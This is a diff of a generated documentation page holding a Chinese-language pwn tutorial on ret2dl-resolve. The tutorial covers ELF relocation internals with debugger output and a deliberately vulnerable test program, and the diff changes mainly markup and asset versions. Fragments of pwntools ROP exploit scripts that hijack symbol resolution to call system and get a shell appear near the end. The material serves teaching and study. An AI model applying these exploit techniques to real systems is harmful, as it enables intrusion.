@@ -38,7 +38,7 @@
         <meta name="lang:search.tokenizer" content="[\uff0c\u3002]+">
       
       <link rel="shortcut icon" href="../../..">
-      <meta name="generator" content="mkdocs-1.0.4, mkdocs-material-4.6.0">
+      <meta name="generator" content="mkdocs-1.0.4, mkdocs-material-4.6.2">
     
     
       
@@ -46,9 +46,9 @@
       
     
     
-      <link rel="stylesheet" href="../../../assets/stylesheets/application.e194128b.css">
+      <link rel="stylesheet" href="../../../assets/stylesheets/application.adb8469c.css">
       
-        <link rel="stylesheet" href="../../../assets/stylesheets/application-palette.3e3d1dff.css">
+        <link rel="stylesheet" href="../../../assets/stylesheets/application-palette.a8b3c06d.css">
       
       
         
@@ -57,7 +57,7 @@
       
     
     
-      <script src="../../../assets/javascripts/modernizr.74668098.js"></script>
+      <script src="../../../assets/javascripts/modernizr.86422ebf.js"></script>
     
     
       
@@ -2874,7 +2874,7 @@
 GOT - GLOBAL OFFSET TABLE<br />
 参考<a href="http://pwn4.fun/2016/11/09/Return-to-dl-resolve/">pwn4.fun</a><br />
 测试程序源码，编译环境为ubuntu16.04 ,命令<code>gcc -o bof -m32 -fno-stack-protector bof.c</code><br />
-<div class="codehilite"><pre><span></span><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp"></span>
+<div class="codehilite"><pre><span></span><code><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp"></span>
 <span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
 <span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp"></span>
 
@@ -2893,10 +2893,10 @@ GOT - GLOBAL OFFSET TABLE<br />
     <span class="n">vuln</span><span class="p">();</span>
     <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
 <span class="p">}</span>
-</pre></div></p>
+</code></pre></div></p>
 <h2 id="elf">从ELF文件格式开始<a class="headerlink" href="#elf" title="Permanent link">&para;</a></h2>
 <p>我们都知道 elf的<code>.text</code> 存放指令，<code>.data</code>存放数据，<code>.bss</code>存放未初始化变量等,这些Section的定义是由下面的数据结构决定。
-<div class="codehilite"><pre><span></span>typedef struct {
+<div class="codehilite"><pre><span></span><code>typedef struct {
     Elf32_Word sh_name;      // 节头部字符串表节区的索引
     Elf32_Word sh_type;      // 节类型
     Elf32_Word sh_flags;     // 节标志，用于描述属性
@@ -2908,9 +2908,9 @@ GOT - GLOBAL OFFSET TABLE<br />
     Elf32_Word sh_addralign; // 节对齐约束
     Elf32_Word sh_entsize;   // 固定大小的节表项的长度
 } Elf32_Shdr;
-</pre></div>
+</code></pre></div>
 使用命令 <code>readelf -S bof</code> 就可以看到
-<div class="codehilite"><pre><span></span>There are 31 section headers, starting at offset 0x18a4:
+<div class="codehilite"><pre><span></span><code>There are 31 section headers, starting at offset 0x18a4:
 
 Section Headers:
   [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al
@@ -2950,19 +2950,19 @@ Key to Flags:
   L (link order), O (extra OS processing required), G (group), T (TLS),
   C (compressed), x (unknown), o (OS specific), E (exclude),
   p (processor specific)
-</pre></div></p>
+</code></pre></div></p>
 <h2 id="entries">entries<a class="headerlink" href="#entries" title="Permanent link">&para;</a></h2>
 <p>如果程序由是<code>dynamically</code> 那么由于很多符号都是运行时绑定(plt got got.plt...) 那么为了完成这一过程，头部就增加了<code>PT_DYNAMIC</code>的Section，<code>.dynamic</code>段，包含了若干entries,结构如下
-<div class="codehilite"><pre><span></span><span class="k">typedef</span> <span class="k">struct</span> <span class="p">{</span>
+<div class="codehilite"><pre><span></span><code><span class="k">typedef</span> <span class="k">struct</span> <span class="p">{</span>
     <span class="n">Elf32_Sword</span> <span class="n">d_tag</span><span class="p">;</span>
     <span class="k">union</span> <span class="p">{</span>
         <span class="n">Elf32_Word</span> <span class="n">d_val</span><span class="p">;</span>
         <span class="n">Elf32_Addr</span> <span class="n">d_ptr</span><span class="p">;</span>
     <span class="p">}</span> <span class="n">d_un</span><span class="p">;</span>
 <span class="p">}</span> <span class="n">Elf32_Dyn</span><span class="p">;</span>
-</pre></div>
+</code></pre></div>
 使用命令<code>readelf -d bof</code> 就可以看到这个段的数据结构，注意Name/Value就是那个联合体。
-<div class="codehilite"><pre><span></span> Tag        Type                         Name/Value
+<div class="codehilite"><pre><span></span><code> Tag        Type                         Name/Value
  0x00000001 (NEEDED)                     Shared library: [libc.so.6]
  0x0000000c (INIT)                       0x8048358
  0x0000000d (FINI)                       0x8048624
@@ -2987,44 +2987,44 @@ Key to Flags:
  0x6fffffff (VERNEEDNUM)                 1
  0x6ffffff0 (VERSYM)                     0x80482e4
  0x00000000 (NULL)                       0x0
-</pre></div></p>
+</code></pre></div></p>
 <h2 id="plt">plt详解<a class="headerlink" href="#plt" title="Permanent link">&para;</a></h2>
 <p><code>ret2dl</code>攻击方法就是我们自己伪造函数签名，然后在plt的过程中<code>glibc</code>伪造的函数地址写入到真实函数的got上，达到任意函数调用的效果。
 首先看下调用write的过程。
-<div class="codehilite"><pre><span></span>pwndbg&gt; plt
+<div class="codehilite"><pre><span></span><code>pwndbg&gt; plt
 0x8048390: setbuf@plt
 0x80483a0: read@plt
 0x80483b0: strlen@plt
 0x80483c0: __libc_start_main@plt
 0x80483d0: write@pl
-</pre></div>
+</code></pre></div>
 可知write的地址是<code>0x80483d0</code></p>
-<p><div class="codehilite"><pre><span></span>pwndbg&gt; x /5i 0x80483d0
+<p><div class="codehilite"><pre><span></span><code>pwndbg&gt; x /5i 0x80483d0
    0x80483d0 &lt;write@plt&gt;:       jmp    DWORD PTR ds:0x804a01c
    0x80483d6 &lt;write@plt+6&gt;:     push   0x20
    0x80483db &lt;write@plt+11&gt;:    jmp    0x8048380
    0x80483e0 &lt;__gmon_start__@plt&gt;:      jmp    DWORD PTR ds:0x8049ffc
    0x80483e6 &lt;__gmon_start__@plt+6&gt;:    xchg   ax,ax
-</pre></div>
+</code></pre></div>
 jmp到了<code>0x804a01c</code>
-<div class="codehilite"><pre><span></span>pwndbg&gt; x /10gx 0x804a01c
+<div class="codehilite"><pre><span></span><code>pwndbg&gt; x /10gx 0x804a01c
 0x804a01c:      0x00000000080483d6      0x0000000000000000
 0x804a02c:      0x0000000000000000      0x0000000000000000
-</pre></div>
+</code></pre></div>
 实际调用了<code>0x80483d6</code> 即<code>write@plt+6</code> 可以看到jmp到了plt[0]
-<div class="codehilite"><pre><span></span>pwndbg&gt; x /3i 0x8048380
+<div class="codehilite"><pre><span></span><code>pwndbg&gt; x /3i 0x8048380
    0x8048380:   push   DWORD PTR ds:0x804a004
    0x8048386:   jmp    DWORD PTR ds:0x804a008
    0x804838c:   add    BYTE PTR [eax],a
-</pre></div>
+</code></pre></div>
 压入了.got[1]，跳转.got[2]
 got[0]保存了.dynamic地址:<code>0x08049f14</code>，got[1]保存了linker的ID info:<code>0xf7ffd940</code>，got[2]保存了dynamic linker的地址:<code>0xf7fead90</code>,后面是各个函数的地址，这里是setbuf,read...
-<div class="codehilite"><pre><span></span>pwndbg&gt; x /10w 0x08049ffc
+<div class="codehilite"><pre><span></span><code>pwndbg&gt; x /10w 0x08049ffc
 0x8049ffc:      0x00000000      0x08049f14      0xf7ffd940      0xf7fead90
 0x804a00c:      0x08048396      0x080483a6      0x080483b6      0xf7dffd90
-</pre></div>
+</code></pre></div>
 实际上，这个过程执行了<code>_dl_runtime_resolve(link_map, reloc_arg)</code>,这个函数在<code>glibc-2.23/sysdeps/i386/dl-trampoline.S</code>这个汇编文件里会调用<code>_dl_fixup</code>，用来填充GOT，</p>
-<p><div class="codehilite"><pre><span></span><span class="n">_dl_fixup</span><span class="p">(</span><span class="k">struct</span> <span class="n">link_map</span> <span class="o">*</span><span class="n">l</span><span class="p">,</span> <span class="n">ElfW</span><span class="p">(</span><span class="n">Word</span><span class="p">)</span> <span class="n">reloc_arg</span><span class="p">)</span>
+<p><div class="codehilite"><pre><span></span><code><span class="n">_dl_fixup</span><span class="p">(</span><span class="k">struct</span> <span class="n">link_map</span> <span class="o">*</span><span class="n">l</span><span class="p">,</span> <span class="n">ElfW</span><span class="p">(</span><span class="n">Word</span><span class="p">)</span> <span class="n">reloc_arg</span><span class="p">)</span>
 <span class="p">{</span>
     <span class="c1">// 首先通过参数reloc_arg计算重定位入口，这里的JMPREL即.rel.plt，reloc_offset即reloc_arg</span>
     <span class="k">const</span> <span class="n">PLTREL</span> <span class="o">*</span><span class="k">const</span> <span class="n">reloc</span> <span class="o">=</span> <span class="p">(</span><span class="k">const</span> <span class="kt">void</span> <span class="o">*</span><span class="p">)</span> <span class="p">(</span><span class="n">D_PTR</span> <span class="p">(</span><span class="n">l</span><span class="p">,</span> <span class="n">l_info</span><span class="p">[</span><span class="n">DT_JMPREL</span><span class="p">])</span> <span class="o">+</span> <span class="n">reloc_offset</span><span class="p">);</span>
@@ -3039,12 +3039,12 @@ got[0]保存了.dynamic地址:<code>0x08049f14</code>，got[1]保存了linker的
     <span class="c1">// 最后把value写入相应的GOT表条目中</span>
     <span class="k">return</span> <span class="nf">elf_machine_fixup_plt</span> <span class="p">(</span><span class="n">l</span><span class="p">,</span> <span class="n">result</span><span class="p">,</span> <span class="n">reloc</span><span class="p">,</span> <span class="n">rel_addr</span><span class="p">,</span> <span class="n">value</span><span class="p">);</span>
 <span class="p">}</span>
-</pre></div>
+</code></pre></div>
 我们无法控制link_map(got[1])的值，只能控制reloc_arg。</p>
 <h2 id="hacking-_dl_fixup">hacking _dl_fixup<a class="headerlink" href="#hacking-_dl_fixup" title="Permanent link">&para;</a></h2>
 <p>这一以 <code>call write@plt</code>为例子.
 首先，第一行代码通过<code>write@plt+6:0x20</code>，找到<code>JMPREL</code>中的write项，通过<code>.dynamic</code>可以发现，<code>JMPREL</code>的地址是<code>0x8048330</code>，其实就是<code>.rel.plt</code>,这个section的数据结构如下,<code>.rel.dyn</code>是用来变量重定位的，暂时不谈
-<div class="codehilite"><pre><span></span><span class="k">typedef</span> <span class="k">struct</span> <span class="p">{</span>
+<div class="codehilite"><pre><span></span><code><span class="k">typedef</span> <span class="k">struct</span> <span class="p">{</span>
     <span class="n">Elf32_Addr</span> <span class="n">r_offset</span><span class="p">;</span>    <span class="c1">// 对于可执行文件，此值为虚拟地址</span>
     <span class="n">Elf32_Word</span> <span class="n">r_info</span><span class="p">;</span>      <span class="c1">// 符号表索引</span>
 <span class="p">}</span> <span class="n">Elf32_Rel</span><span class="p">;</span>
@@ -3052,24 +3052,24 @@ got[0]保存了.dynamic地址:<code>0x08049f14</code>，got[1]保存了linker的
 <span class="cp">#define ELF32_R_SYM(info) ((info)&gt;&gt;8)</span>
 <span class="cp">#define ELF32_R_TYPE(info) ((unsigned char)(info))</span>
 <span class="cp">#define ELF32_R_INFO(sym, type) (((sym)&lt;&lt;8)+(unsigned char)(type))</span>
-</pre></div>
+</code></pre></div>
 使用<code>readelf -r bof</code> 可以看到这两个段的数据结构，省略了<code>.rel.dyn</code>的输出
-<div class="codehilite"><pre><span></span>Relocation section &#39;.rel.plt&#39; at offset 0x330 contains 5 entries:
+<div class="codehilite"><pre><span></span><code>Relocation section &#39;.rel.plt&#39; at offset 0x330 contains 5 entries:
  Offset     Info    Type            Sym.Value  Sym. Name
 0804a00c  00000107 R_386_JUMP_SLOT   00000000   setbuf@GLIBC_2.0
 0804a010  00000207 R_386_JUMP_SLOT   00000000   read@GLIBC_2.0
 0804a014  00000407 R_386_JUMP_SLOT   00000000   strlen@GLIBC_2.0
 0804a018  00000507 R_386_JUMP_SLOT   00000000   __libc_start_main@GLIBC_2.0
 0804a01c  00000607 R_386_JUMP_SLOT   00000000   write@GLIBC_2.0
-</pre></div>
+</code></pre></div>
 其中，offset就是<code>.got.plt</code>中保存的对应函数地址的地址，即*(0804a01c)=&amp;write<br />
 看上面和<code>.rel.dyn</code>相关的两个宏，可以求解出:
-<div class="codehilite"><pre><span></span>ELF32_R_SYM=6
+<div class="codehilite"><pre><span></span><code>ELF32_R_SYM=6
 ELF32_R_TYPE=7
-</pre></div>
+</code></pre></div>
 也就是说Elf32_Sym[6]保存着write的符号表信息，Type为<code>R_386_JUMP_SLOT</code>。Elf32_Sym实际上就是
 <code>.dynsym</code> section，这个section的数据结构如下:
-<div class="codehilite"><pre><span></span>typedef struct
+<div class="codehilite"><pre><span></span><code>typedef struct
 {
     Elf32_Word st_name;     // Symbol name(string table index)
     Elf32_Addr st_value;    // Symbol value
@@ -3078,9 +3078,9 @@ ELF32_R_TYPE=7
     unsigned char st_other; // Symbol visibility under glibc&gt;=2.2
     Elf32_Section st_shndx; // Section index
 } Elf32_Sym;
-</pre></div>
+</code></pre></div>
 使用<code>readelf -s bof</code>可以看到
-<div class="codehilite"><pre><span></span>Symbol table &#39;.dynsym&#39; contains 10 entries:
+<div class="codehilite"><pre><span></span><code>Symbol table &#39;.dynsym&#39; contains 10 entries:
    Num:    Value  Size Type    Bind   Vis      Ndx Name
      0: 00000000     0 NOTYPE  LOCAL  DEFAULT  UND 
      1: 00000000     0 FUNC    GLOBAL DEFAULT  UND setbuf@GLIBC_2.0 (2)
@@ -3092,23 +3092,23 @@ ELF32_R_TYPE=7
      7: 0804a044     4 OBJECT  GLOBAL DEFAULT   26 stdout@GLIBC_2.0 (2)
      8: 0804863c     4 OBJECT  GLOBAL DEFAULT   16 _IO_stdin_used
      9: 0804a040     4 OBJECT  GLOBAL DEFAULT   26 stdin@GLIBC_2.0 (2
-</pre></div>
+</code></pre></div>
 第六个就是我们的write。<br />
 好了，总结下思路，首先，通过ROP控制RIP执行_dl_runtime_resolve(link_map, reloc_arg),其中reloc_arg是我们可控的，控制reloc_arg 使得glibc 索引到我们伪造的<code>.rel.dyn</code>项上，我们可以在bss、data等段进行伪造，其次控制伪造的<code>r_info</code>值，从而控制<code>.dynsym</code>项，<code>r_offset</code>就是我们要改写的write的地址，所以使用原本的就OK，
 我们看下<code>dynsym</code>的第六项（有更好的办法一定要告诉我啊）：
-<div class="codehilite"><pre><span></span>pwndbg&gt; x /16xb 0x8048238
+<div class="codehilite"><pre><span></span><code>pwndbg&gt; x /16xb 0x8048238
 0x8048238:      0x4c    0x00    0x00    0x00    0x00    0x00    0x00    0x00
 0x8048240:      0x00    0x00    0x00    0x00    0x12    0x00    0x00    0x00
-</pre></div>
+</code></pre></div>
 可以发现<code>Elf32_Word st_name=0x4c</code>，也就是说 <code>.dynstr+04c</code>就是字符串write的地址.</p>
-<p><div class="codehilite"><pre><span></span>pwndbg&gt; x /s 0x08048278+0x4c
+<p><div class="codehilite"><pre><span></span><code>pwndbg&gt; x /s 0x08048278+0x4c
 0x80482c4:      &quot;write&quot;
-</pre></div>
+</code></pre></div>
 然后我们就可以伪造<code>.st_name</code>，把write改成system...<br />
 好长的ROP啊</p>
 <h2 id="exp">exp<a class="headerlink" href="#exp" title="Permanent link">&para;</a></h2>
 <p>“你猜怎么伪造<code>.st_name</code>”</p>
-<div class="codehilite"><pre><span></span><span class="ch">#!/usr/bin/python</span>
+<div class="codehilite"><pre><span></span><code><span class="ch">#!/usr/bin/python</span>
 
 <span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 <span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;bof&#39;</span><span class="p">)</span>
@@ -3169,10 +3169,10 @@ ELF32_R_TYPE=7
 <span class="n">payload2</span> <span class="o">+=</span> <span class="s1">&#39;A&#39;</span> <span class="o">*</span> <span class="p">(</span><span class="mi">100</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">payload2</span><span class="p">))</span>
 <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload2</span><span class="p">)</span>
 <span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
-</pre></div>
+</code></pre></div>
 
 <p>“给出一个使用roputils的方法”
-<div class="codehilite"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<div class="codehilite"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 <span class="kn">from</span> <span class="nn">roputils</span> <span class="kn">import</span> <span class="n">ROP</span>
 <span class="n">fpath</span><span class="o">=</span><span class="s1">&#39;./bof&#39;</span>
 <span class="n">p</span><span class="o">=</span><span class="n">process</span><span class="p">(</span><span class="n">fpath</span><span class="p">)</span>
@@ -3195,7 +3195,7 @@ ELF32_R_TYPE=7
 <span class="n">payload</span><span class="o">+=</span><span class="n">rop</span><span class="o">.</span><span class="n">fill</span><span class="p">(</span><span class="mi">100</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span>
 <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
 <span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
-</pre></div></p>
+</code></pre></div></p>
                 
                   
                 
@@ -3295,7 +3295,7 @@ ELF32_R_TYPE=7
       
     </div>
     
-      <script src="../../../assets/javascripts/application.970603a6.js"></script>
+      <script src="../../../assets/javascripts/application.df00da5d.js"></script>
       
         
         
